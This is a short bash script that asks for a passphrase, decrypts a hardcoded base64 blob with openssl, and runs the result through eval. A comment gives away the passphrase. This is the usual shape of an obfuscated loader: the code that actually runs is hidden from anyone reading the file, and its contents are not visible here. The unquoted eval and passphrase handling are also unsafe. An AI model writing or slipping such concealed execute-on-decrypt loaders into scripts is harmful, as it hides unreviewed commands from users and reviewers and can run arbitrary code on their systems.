#!/bin/bash

# We ask the user to enter the passphrase, so that it is not hardcoded in the file
echo "Please enter the passphrase:"
read passphrase

# We validate the passphrase
if [[ -z $passphrase ]]; then
	echo "Passphrase cannot be empty"
	exit 1
fi

# Encrypted payload contents
encrypted_payload="U2FsdGVkX18dJ/wcjyjr8Gr7oxlZXQq64dL5LDuBWpFDWkBct9JfH+1Ii6RvC3oK"

# Decryption code, the passphrase is mypassphrase
decrypted_payload=$(echo "$encrypted_payload" | openssl aes-256-cbc -d -pbkdf2 -iter 1000 -base64 -pass pass:$passphrase)

# Execute decrypted payload
eval $decrypted_payload

